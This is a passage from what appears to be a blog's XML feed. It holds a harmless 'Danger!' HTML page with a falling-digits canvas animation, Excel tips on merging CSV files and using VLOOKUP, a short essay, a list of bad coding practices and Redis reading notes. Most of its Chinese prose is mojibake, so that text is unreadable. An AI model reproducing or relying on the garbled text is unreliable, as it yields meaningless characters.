class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"/favicon.ico"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"apple-touch-icon"</span> <span class="attr">sizes</span>=<span class="string">"180x180"</span> <span class="attr">href</span>=<span class="string">"/images/favicon.jpg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Danger!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    html, body &#123;</span><br><span class="line">        font-family: courier, monospace;</span><br><span class="line">    &#125;</span><br><span class="line">    span &#123;</span><br><span class="line">        animation: flash 1s infinite;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        /*</span><br><span class="line">        * _(:Ğ·ã€âˆ )_</span><br><span class="line"><span class="actionscript">        * Created by Shuqiao Zhang <span class="keyword">in</span> <span class="number">2018.</span></span></span><br><span class="line"><span class="actionscript">        * https:<span class="comment">//zhangshuqiao.org</span></span></span><br><span class="line">        */</span><br><span class="line">        </span><br><span class="line">        /*</span><br><span class="line"><span class="vbscript">        * This program <span class="keyword">is</span> free software: you can redistribute it <span class="keyword">and</span>/<span class="keyword">or</span> modify</span></span><br><span class="line"><span class="javascript">        *  it under the terms <span class="keyword">of</span> the GNU General Public License <span class="keyword">as</span> published by</span></span><br><span class="line"><span class="javascript">        *  the Free Software Foundation, either version <span class="number">3</span> <span class="keyword">of</span> the License, or</span></span><br><span class="line"><span class="vbscript">        *  (at your <span class="keyword">option</span>) any later version.</span></span><br><span class="line">        *</span><br><span class="line"><span class="actionscript">        * This program <span class="keyword">is</span> distributed <span class="keyword">in</span> the hope that it will be useful,</span></span><br><span class="line"><span class="javascript">        *  but WITHOUT ANY WARRANTY; without even the implied warranty <span class="keyword">of</span></span></span><br><span class="line"><span class="vbscript">        *  MERCHANTABILITY <span class="keyword">or</span> FITNESS <span class="keyword">FOR</span> A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="vbscript">        *  GNU General <span class="keyword">Public</span> License <span class="keyword">for</span> more details.</span></span><br><span class="line">        */</span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>),</span></span><br><span class="line"><span class="actionscript">            context = canvas.getContext(<span class="string">"2d"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(canvas);</span></span><br><span class="line"><span class="actionscript">        canvas.style.cssText = <span class="string">"position: fixed; top: 0; left: 0; background-color: #111; z-index: -100;"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> W = <span class="built_in">window</span>.innerWidth,</span></span><br><span class="line"><span class="javascript">            H = <span class="built_in">window</span>.innerHeight;</span></span><br><span class="line">        canvas.width = W;</span><br><span class="line">        canvas.height = H;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> colunms = <span class="number">49</span>,</span></span><br><span class="line"><span class="javascript">            fontSize = <span class="built_in">Math</span>.floor(W / colunms),</span></span><br><span class="line"><span class="vbscript">            <span class="built_in">string</span> = <span class="string">"1234567890"</span>,</span></span><br><span class="line">            number = [],</span><br><span class="line">            jmax = 2;</span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        setInterval(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            context.fillStyle = <span class="string">"rgba(0,0,0,0.4)"</span>;</span></span><br><span class="line">            context.fillRect(0, 0, W, H);</span><br><span class="line"><span class="actionscript">            context.font = <span class="string">"700 "</span> + fontSize + <span class="string">"px monospace"</span>;</span></span><br><span class="line"><span class="actionscript">            context.fillStyle = <span class="string">"#00cc33"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; colunms; i++) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (i % <span class="number">10</span> == <span class="number">9</span>) <span class="keyword">continue</span>;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">1</span>; j &lt; jmax; j++) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * string.length);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">var</span> x = (i + <span class="number">0.5</span>) * fontSize;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">var</span> y = j * fontSize;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (!number[[x, y]] || <span class="built_in">Math</span>.random() &lt; <span class="number">0.1</span>) number[[x, y]] = string[index];</span></span><br><span class="line">                    context.fillText(number[[x, y]], x, y);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (jmax &lt; <span class="built_in">Math</span>.ceil(H / fontSize)) jmax++;</span></span><br><span class="line">        &#125;, 80);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">width</span>=<span class="string">"1"</span> <span class="attr">height</span>=<span class="string">"821"</span> <span class="attr">style</span>=<span class="string">"position: fixed; top: 0px; left: 0px; background-color: rgb(17, 17, 17); z-index: -100;"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><script async src="//jsfiddle.net/palemoky/newLybz4/1/embed/result/"></script><blockquote><p>ç”±äº jsfiddle åœ¨å¤§é™†æœ‰æ—¶ä¸å¯è®¿é—®ï¼Œå¯èƒ½æ— æ³•åŠ è½½ç»“æœï¼Œè¯·ç›´æ¥ä¿å­˜è¿è¡Œä»¥ä¸Šä»£ç æŸ¥çœ‹æ•ˆæœã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Excel å¤„ç†å°æŠ€å·§</title>
      <link href="/post/excel-tricks/"/>
      <url>/post/excel-tricks/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g93qys36u6j30m80d575i.jpg" alt=""></p><a id="more"></a><h1 id="å°†å¤šä¸ª-csv-æ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ª"><a href="#å°†å¤šä¸ª-csv-æ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ª" class="headerlink" title="å°†å¤šä¸ª csv æ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ª"></a>å°†å¤šä¸ª csv æ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ª</h1><p>åœ¨ macOS ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å°†å¤šä¸ª csv æ–‡ä»¶åˆå¹¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</p><p>ä¸å…³å¿ƒæ–‡ä»¶çš„é¡ºåº<br><code>$ cat *.csv &gt; all-in-one.csv</code></p><p>éœ€è¦æ–‡ä»¶é¡ºæœ‰åº<br><code>$ cat file1.csv file2.csv ... file24.csv &gt; all-in-one.csv</code></p><blockquote><p>è¯¥æ–¹æ³•æ¥è‡ªçŸ¥ä¹<a href="https://www.zhihu.com/question/26525722/answer/33093791" target="_blank" rel="noopener">Rio çš„å›ç­”</a></p></blockquote><h1 id="ä½¿ç”¨-VLOOKUP-å‡½æ•°çºµå‘æŸ¥æ‰¾"><a href="#ä½¿ç”¨-VLOOKUP-å‡½æ•°çºµå‘æŸ¥æ‰¾" class="headerlink" title="ä½¿ç”¨ VLOOKUP å‡½æ•°çºµå‘æŸ¥æ‰¾"></a>ä½¿ç”¨ VLOOKUP å‡½æ•°çºµå‘æŸ¥æ‰¾</h1><p>å‡å¦‚æˆ‘ä»¬ç°åœ¨æœ‰ä¸¤ä¸ªå·¥ä½œè¡¨ï¼Œåˆ†åˆ«ä¸º Sheet1 å’Œ Sheet2ï¼Œå†…å®¹åˆ†åˆ«ä¸º<br>Sheet1 çš„å†…å®¹<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g93qf6p4v6j308g07kaaa.jpg" alt=""></p><p>Sheet2 çš„å†…å®¹<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g93qgct6whj30980783ys.jpg" alt=""></p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°† Sheet2 çš„åœ°åŒºä¿¡æ¯è¡¥å……åœ¨ sheet1 çš„æœ€åä¸€åˆ—ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨<code>C2</code>å•å…ƒæ ¼è¾“å…¥å…¬å¼<code>=VLOOKUP(A2,Sheet2!A2:B2,2,FALSE)</code>ï¼Œç„¶åæ‹–åŠ¨å•å…ƒæ ¼å³å¯è‡ªåŠ¨è¡¥å……ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g93qmt0qwej30vw08k0u7.jpg" alt=""></p><blockquote><p>âš ï¸ Sheet1 ä¸ Sheet2 è¦æŸ¥æ‰¾çš„å€¼é¡ºåºéœ€è¦ä¸€è‡´ï¼Œå¦åˆ™æ— æ³•åŒ¹é…ã€‚</p></blockquote><p>ç°åœ¨ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹è¿™ä¸ªå…¬å¼åˆ†åˆ«æ˜¯ä»€ä¹ˆæ„æ€ï¼š<br><code>lookup_value</code>ï¼šè¦æŸ¥æ‰¾çš„å€¼ï¼Œç±»ä¼¼äº SQL ä¸­çš„ <code>join on</code> æ¡ä»¶<br><code>table_array</code>ï¼šè¦æŸ¥æ‰¾çš„åŒºåŸŸï¼Œå³æˆ‘ä»¬è¦åœ¨ Sheet2 ä¸­è¦æ£€ç´¢å“ªå‡ åˆ—<br><code>col_index_num</code>ï¼šè¿”å›æ•°æ®åœ¨æŸ¥æ‰¾åŒºåŸŸçš„ç¬¬å‡ åˆ—æ•°<br><code>[range_lookup]</code>ï¼šæ¨¡ç³ŠåŒ¹é…(TRUE)/ç²¾ç¡®åŒ¹é…(FALSE)</p><p>å†å›åˆ°æˆ‘ä»¬çš„å…¬å¼ï¼Œ<code>A2</code>è¡¨ç¤ºæˆ‘ä»¬è¦åœ¨å½“å‰ Sheet ä¸­æŸ¥æ‰¾<code>A2</code>å•å…ƒæ ¼çš„å€¼ï¼Œ<code>Sheet2!A2:B2</code>è¡¨ç¤ºæˆ‘ä»¬è¦åœ¨ Sheet2 çš„<code>A2</code>è‡³<code>B2</code>å•å…ƒæ ¼é—´æŸ¥æ‰¾åŒ¹é…çš„å€¼ï¼Œ<code>2</code>åˆ™è¡¨ç¤ºæˆ‘ä»¬å– Sheet2 åŒ¹é…ç»“æœçš„ç¬¬ 2 åˆ—ï¼Œ<code>FALSE</code>è¡¨ç¤ºç²¾ç¡®åŒ¹é…æŸ¥æ‰¾çš„ç»“æœã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> excel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ‚è°ˆ</title>
      <link href="/post/informations-essays/"/>
      <url>/post/informations-essays/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g92d5qfevhj30ka0eh3zs.jpg" alt=""></p><a id="more"></a><p>åœ¨ 19 ä¸–çºªæœ«ï¼Œä¸€ä¸ªå°é•‡ä¸Šå‘ç”Ÿçš„äº‹æƒ…å°±åƒå‘ç”Ÿåœ¨å¦ä¸€ä¸ªæ˜Ÿçƒä¸Šã€‚ç”µè¯å’Œæ— çº¿ç”µæ”¹å˜äº† 20 ä¸–çºªï¼Œæ‰“ç ´äº†è¿™äº›éšœç¢ã€‚21 ä¸–çºªï¼ŒSNS è®©åœ°çƒæ‘å¾—ä»¥å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ–¹å°å°çš„å±å¹•å‰äº†è§£åˆ°ä¸–ç•Œå¦ä¸€ç«¯æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…ã€‚</p><p>ä»çƒ½ç«ç‹¼çƒŸåˆ°æŠ¥çº¸æ‚å¿—ï¼Œå†åˆ°å¹¿æ’­ç”µè§†ï¼Œå†åˆ°äº’è”ç½‘ã€ç§»åŠ¨äº’è”ç½‘ï¼Œæ¯ä¸€æ¬¡çš„ä¿¡æ¯é©å‘½éƒ½åŠ é€Ÿäº†äººç±»æ–‡æ˜ã€‚è™½ç„¶ä¿¡æ¯çš„å½¢å¼åœ¨ä¸æ–­çš„å˜åŒ–ï¼Œä½†ä¿¡æ¯çš„æœ¬è´¨å¹¶æ²¡æœ‰å¤ªå¤šçš„å˜åŒ–ï¼Œäººä»¬åœ¨ä¸æ–­è¿½æ±‚ä¿¡æ¯æ›´é«˜æ•ˆçš„è·å–ï¼šæ–‡å­—æ¯”è‚¢ä½“èƒ½è¡¨è¾¾æ›´å¤šçš„ä¿¡æ¯ï¼Œå£°éŸ³åˆèƒ½ä¼ é€’æ›´ä¸°å¯Œçš„ä¿¡æ¯ï¼Œè§†é¢‘åˆ™æ‰¿è½½äº†æ›´å¤šçš„ä¿¡æ¯å®¹é‡ã€‚</p><p>è™½ç„¶ä¿¡æ¯è½½ä½“çš„å½¢å¼åœ¨ä¸æ–­çš„è¿›åŒ–ï¼Œä½†ä¿¡æ¯çš„æœ‰æ•ˆæ€§æ˜¯å¦ä¸€ä¸ªä¼´éšç€çš„é—®é¢˜ï¼Œäººä»¬å¦‚ä½•æ‰èƒ½åœ¨æ´ªæ°´èˆ¬çš„ä¿¡æ¯æµä¸­é«˜æ•ˆæ£€ç´¢åˆ°æœ‰æ•ˆä¿¡æ¯ï¼Ÿå¦‚ä»Šï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œæœºå™¨å­¦ä¹ å’Œç®—æ³•æ¨èæå‡äº†æœ‰æ•ˆä¿¡æ¯ï¼ŒApple News+ åˆ™é€šè¿‡å¸®åŠ©äººä»¬æ£€ç´¢é«˜ä»·å€¼ä¿¡æ¯æä¾›æœåŠ¡ã€‚åœ¨ä»»ä½•æ—¶ä»£ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æœ‰æ€è¾¨èƒ½åŠ›ï¼ŒæŒæ¡é«˜æ•ˆè·å–ä¿¡æ¯çš„æŠ€å·§ï¼Œè®©ä½ çš„äººç”Ÿå»¶é•¿ï¼Œå›åˆ°è¿‡å»ï¼Œçœ‹åˆ°æœªæ¥ã€‚</p><hr><p>å‚è€ƒèµ„æ–™</p><ol><li><a href="https://www.collaborativefund.com/blog/three-big-things-the-most-important-forces-shaping-the-world/" target="_blank" rel="noopener">Three Big Things: The Most Important Forces Shaping the World</a></li><li><a href="https://book.douban.com/subject/1013208/" target="_blank" rel="noopener">ã€Šå¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦ã€‹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æŒ‚å—å¢™</title>
      <link href="/post/Wall-of-Shame/"/>
      <url>/post/Wall-of-Shame/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xlov4al5j30m80agdgk.jpg" alt=""></p><a id="more"></a><h1 id="é”™è¯¯å˜é‡å‘½å-amp-æ·±å±‚åµŒå¥—å¾ªç¯"><a href="#é”™è¯¯å˜é‡å‘½å-amp-æ·±å±‚åµŒå¥—å¾ªç¯" class="headerlink" title="é”™è¯¯å˜é‡å‘½å &amp; æ·±å±‚åµŒå¥—å¾ªç¯"></a>é”™è¯¯å˜é‡å‘½å &amp; æ·±å±‚åµŒå¥—å¾ªç¯</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xkmljfu1j31t40oswiz.jpg" alt=""></p><h1 id="switch-åµŒå¥—-amp-æ»¥ç”¨æ•°å­—æšä¸¾"><a href="#switch-åµŒå¥—-amp-æ»¥ç”¨æ•°å­—æšä¸¾" class="headerlink" title="switch åµŒå¥— &amp; æ»¥ç”¨æ•°å­—æšä¸¾"></a>switch åµŒå¥— &amp; æ»¥ç”¨æ•°å­—æšä¸¾</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xkmtcrgoj30u00u8djh.jpg" alt=""></p><h1 id="ä¸-OK-ä¸è¦è¿”å›-OKï¼ŒOKï¼Ÿ"><a href="#ä¸-OK-ä¸è¦è¿”å›-OKï¼ŒOKï¼Ÿ" class="headerlink" title="ä¸ OK ä¸è¦è¿”å› OKï¼ŒOKï¼Ÿ"></a>ä¸ OK ä¸è¦è¿”å› OKï¼ŒOKï¼Ÿ</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xkofqkonj30hk05sgls.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xkphec22j30u806y0th.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xkqyaevsj31fg07074w.jpg" alt=""></p><h1 id="æ— æ•ˆå¼‚å¸¸"><a href="#æ— æ•ˆå¼‚å¸¸" class="headerlink" title="æ— æ•ˆå¼‚å¸¸"></a>æ— æ•ˆå¼‚å¸¸</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xks8hsgpj30rg040jry.jpg" alt=""></p><p>ä½ èƒ½å‘Šè¯‰æˆ‘è¿™æ ·çš„æŠ¥é”™æœ‰ä»€ä¹ˆæ„ä¹‰å—ï¼Ÿæ˜¯ä»€ä¹ˆåŸå› ï¼Ÿæˆ‘è¯¥æ€ä¹ˆåšï¼Ÿ</p><h1 id="æ»¥ç”¨æ•°å­—æšä¸¾"><a href="#æ»¥ç”¨æ•°å­—æšä¸¾" class="headerlink" title="æ»¥ç”¨æ•°å­—æšä¸¾"></a>æ»¥ç”¨æ•°å­—æšä¸¾</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xla935ftj306505o0ss.jpg" alt=""></p><h1 id="æ»¥ç”¨é™æ€æ–¹æ³•"><a href="#æ»¥ç”¨é™æ€æ–¹æ³•" class="headerlink" title="æ»¥ç”¨é™æ€æ–¹æ³•"></a>æ»¥ç”¨é™æ€æ–¹æ³•</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xl0z6oo0j30me0qnq6n.jpg" alt=""></p><h1 id="æ–¹æ³•è‡ƒè‚¿"><a href="#æ–¹æ³•è‡ƒè‚¿" class="headerlink" title="æ–¹æ³•è‡ƒè‚¿"></a>æ–¹æ³•è‡ƒè‚¿</h1><p>//todo</p><h1 id="æ— è§†-IDE-è­¦å‘Š"><a href="#æ— è§†-IDE-è­¦å‘Š" class="headerlink" title="æ— è§† IDE è­¦å‘Š"></a>æ— è§† IDE è­¦å‘Š</h1><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8xl6adn42j301817cmwy.jpg" alt=""></p><h1 id="git-åŒåæ–‡ä»¶å¤§å°å†™æ•æ„ŸåŒºåˆ†"><a href="#git-åŒåæ–‡ä»¶å¤§å°å†™æ•æ„ŸåŒºåˆ†" class="headerlink" title="git åŒåæ–‡ä»¶å¤§å°å†™æ•æ„ŸåŒºåˆ†"></a>git åŒåæ–‡ä»¶å¤§å°å†™æ•æ„ŸåŒºåˆ†</h1><p>å¤§å¤šæ•°çš„å¼€å‘è€…ç”µè„‘æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œè¿™ä¼šå¯¼è‡´ Git åœ¨è¿™æ ·çš„ç”µè„‘ä¸­å°†ä¸¤ä¸ªæ–‡ä»¶è¯†åˆ«ä¸ºåŒä¸€ä¸ªæ–‡ä»¶ï¼Œå§‹ç»ˆæ£€æµ‹åˆ°æœ‰ä¸€ä¸ªæ–‡ä»¶è¢«ä¿®æ”¹è€Œåˆæ— æ³•è¢«è·Ÿè¸ªã€‚ä½ ç¡®å®šåŒåå¤§å°å†™æ–‡ä»¶æ‰€å¸¦æ¥çš„é”™è¯¯é£é™©æ˜¯å°äºä¼˜åŠ¿æ”¶ç›Šå—ï¼Ÿ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠRediså¼€å‘ä¸è¿ç»´ã€‹</title>
      <link href="/post/redis-devops/"/>
      <url>/post/redis-devops/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8ronsawmbj30ku0aft9d.jpg" alt=""></p><a id="more"></a><h1 id="ç¬¬-1-ç« -åˆè¯†-Redis"><a href="#ç¬¬-1-ç« -åˆè¯†-Redis" class="headerlink" title="ç¬¬ 1 ç«  åˆè¯† Redis"></a>ç¬¬ 1 ç«  åˆè¯† Redis</h1><p>å¯¹äºå¤§éƒ¨åˆ†æ•°æ®åº“æ¥è¯´ï¼Œæ’å…¥è¡Œæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦éå¸¸å¿«ï¼ˆæ’å…¥è¡Œåªä¼šåœ¨ç¡¬ç›˜æ–‡ä»¶æœ«å°¾è¿›è¡Œå†™å…¥ï¼‰ã€‚ä¸è¿‡ï¼Œå¯¹è¡¨é‡Œé¢çš„è¡Œè¿›è¡Œæ›´æ–°å´æ˜¯ä¸€ä¸ªé€Ÿåº¦ç›¸å½“æ…¢çš„æ“ä½œï¼Œå› ä¸ºè¿™ç§æ›´æ–°é™¤äº†ä¼šå¼•èµ·ä¸€æ¬¡éšæœºè¯»ä¹‹å¤–ï¼Œè¿˜å¯èƒ½ä¼šå¼•èµ·ä¸€æ¬¡éšæœºå†™ã€‚</p><h2 id="Redis-æ•°æ®ç±»å‹"><a href="#Redis-æ•°æ®ç±»å‹" class="headerlink" title="Redis æ•°æ®ç±»å‹"></a>Redis æ•°æ®ç±»å‹</h2><ul><li>string(Bitmaps &amp; HyperLogLog)</li><li>hash</li><li>list</li><li>set</li><li>zset</li></ul><h2 id="Redis-æä¾›çš„åŠŸèƒ½"><a href="#Redis-æä¾›çš„åŠŸèƒ½" class="headerlink" title="Redis æä¾›çš„åŠŸèƒ½"></a>Redis æä¾›çš„åŠŸèƒ½</h2><ul><li>é”®è¿‡æœŸ</li><li>å‘å¸ƒè®¢é˜…ï¼ˆæ¶ˆæ¯ç³»ç»Ÿï¼‰</li><li>äº‹åŠ¡</li><li>æµæ°´çº¿ï¼ˆä¸€æ‰¹å‘½ä»¤ä¸€æ¬¡å‘é€åˆ° Redisï¼Œé¿å…ç½‘ç»œå¼€é”€ï¼‰</li><li>Lua è„šæœ¬</li></ul><h2 id="Redis-ä½¿ç”¨åœºæ™¯"><a href="#Redis-ä½¿ç”¨åœºæ™¯" class="headerlink" title="Redis ä½¿ç”¨åœºæ™¯"></a>Redis ä½¿ç”¨åœºæ™¯</h2><ul><li>ç¼“å­˜</li><li>æ’è¡Œæ¦œ</li><li>è®¡æ•°å™¨ï¼ˆè§†é¢‘æ’­æ”¾æ•°ï¼Œå•†å“æµè§ˆé‡ï¼‰</li><li>ç¤¾äº¤ï¼ˆå…±åŒå¥½å‹ã€ç²‰ä¸ã€ç‚¹èµï¼‰</li><li>æ¶ˆæ¯é˜Ÿåˆ—</li><li>å…±äº« Session</li><li>é™é€Ÿï¼ˆå¦‚ï¼Œ60s è·å–ä¸€æ¬¡æ‰‹æœºéªŒè¯ç ï¼š<code>redis.set(phoneNum, 1, &quot;EX 60&quot;, &quot;NX&quot;)</code>ï¼‰</li><li>ä½¿ç”¨å“ˆå¸Œç±»å‹æ¨¡æ‹Ÿå…³ç³»å‹æ•°æ®åº“ï¼ˆä¼˜ç‚¹ï¼šç”¨æˆ·ä¿¡æ¯å†…èšæ€§è¾ƒå¼ºï¼Œå ç”¨çš„é”®è¾ƒå°‘ï¼›ç¼ºç‚¹ï¼šå“ˆå¸Œç±»å‹æ˜¯ç¨€ç–çš„ï¼Œéš¾ä»¥åšå¤æ‚çš„å…³ç³»æŸ¥è¯¢ã€‚æ³¨æ„ï¼šè¦æ§åˆ¶å“ˆå¸Œåœ¨ ziplist å’Œ hashtable ä¸¤ç§å†…éƒ¨ç¼–ç çš„è½¬æ¢ï¼Œhashtable ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜ï¼‰</li></ul><h2 id="ä¸ºä»€ä¹ˆ-Redis-å¾ˆå¿«ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆ-Redis-å¾ˆå¿«ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆ Redis å¾ˆå¿«ï¼Ÿ"></a>ä¸ºä»€ä¹ˆ Redis å¾ˆå¿«ï¼Ÿ</h2><ul><li>å†…å­˜è®¿é—®</li><li>C è¯­è¨€å®ç°</li><li>å•çº¿ç¨‹æ¶æ„ï¼Œé¿å…çº¿ç¨‹åˆ‡æ¢ä¸ç«æ€äº§ç”Ÿçš„æ¶ˆè€—</li><li>I/O å¤šè·¯å¤ç”¨æ¨¡å‹ï¼ˆepollï¼‰</li></ul><p>å®‰è£…è½¯ä»¶æ—¶ï¼Œä¸ºè½¯ä»¶å»ºç«‹è½¯è¿æ¥æ˜¯ä¸€ç§å¥½ä¹ æƒ¯ï¼Œé¿å…å°†è½¯ä»¶å›ºå®šåœ¨æŒ‡å®šç‰ˆæœ¬ä¸Šï¼Œæœ‰åˆ©äºæœªæ¥è½¯ä»¶çš„ç‰ˆæœ¬å‡çº§ã€‚</p><p>Redis å€Ÿé‰´äº† Linux å¯¹äºç‰ˆæœ¬å·çš„å‘½åè§„åˆ™ï¼šç‰ˆæœ¬å·ç¬¬äºŒä½å¦‚æœæ˜¯å¥‡æ•°ï¼Œåˆ™ä¸ºéç¨³å®šç‰ˆæœ¬ï¼ˆå¦‚ 2.7ã€2.9ã€3.1ï¼‰ï¼Œå¦åˆ™ä¸ºç¨³å®šç‰ˆæœ¬ï¼ˆå¦‚ 2.6ã€2.8ã€3.0ï¼‰</p><h2 id="Redis-å¯æ‰§è¡Œæ–‡ä»¶è¯´æ˜"><a href="#Redis-å¯æ‰§è¡Œæ–‡ä»¶è¯´æ˜" class="headerlink" title="Redis å¯æ‰§è¡Œæ–‡ä»¶è¯´æ˜"></a>Redis å¯æ‰§è¡Œæ–‡ä»¶è¯´æ˜</h2><table><thead><tr><th>å‘½ä»¤</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>redis-server</code></td><td>å¯åŠ¨ Redis</td></tr><tr><td><code>redis-cli</code></td><td>Redis å‘½ä»¤è¡Œå®¢æˆ·ç«¯</td></tr><tr><td><code>redis-cli shutdown</code></td><td>å…³é—­ Redis</td></tr><tr><td><code>redis-benchmark</code></td><td>Redis åŸºå‡†æµ‹è¯•å·¥å…·</td></tr><tr><td><code>redis-check-of</code></td><td>Redis AOF æŒä¹…åŒ–æ–‡ä»¶æ£€æµ‹ä¸ä¿®å¤å·¥å…·</td></tr><tr><td><code>redis-check-dump</code></td><td>Redis RDB æŒä¹…åŒ–æ–‡ä»¶æ£€æµ‹ä¸ä¿®å¤å·¥å…·</td></tr><tr><td><code>redis-sentinel</code></td><td>å¯åŠ¨ Redis Sentinel</td></tr></tbody></table><h2 id="å¯åŠ¨-Redis-çš„3ç§æ–¹å¼"><a href="#å¯åŠ¨-Redis-çš„3ç§æ–¹å¼" class="headerlink" title="å¯åŠ¨ Redis çš„3ç§æ–¹å¼"></a>å¯åŠ¨ Redis çš„3ç§æ–¹å¼</h2><ol><li>é»˜è®¤é…ç½®(<code>redis-server</code>)</li><li>è¿è¡Œé…ç½®(<code>redis-server --port 6380</code>)</li><li>é…ç½®æ–‡ä»¶(<code>redis-server /opt/redis/redis.conf</code>)</li></ol><p>python çš„ redis é«˜æ€§èƒ½æ‰©å±•æ˜¯ hiredisï¼ŒPHP åˆ™æ˜¯ phpredisã€‚</p><h1 id="ç¬¬-2-ç« -API-çš„ç†è§£å’Œä½¿ç”¨"><a href="#ç¬¬-2-ç« -API-çš„ç†è§£å’Œä½¿ç”¨" class="headerlink" title="ç¬¬ 2 ç«  API çš„ç†è§£å’Œä½¿ç”¨"></a>ç¬¬ 2 ç«  API çš„ç†è§£å’Œä½¿ç”¨</h1><table><thead><tr><th>å‘½ä»¤</th><th>é€‰é¡¹</th><th>è¿”å›å€¼</th><th>å«ä¹‰</th><th>å¤æ‚åº¦</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>keys pattern</code></td><td>pattern ä½¿ç”¨çš„æ˜¯ glob é£æ 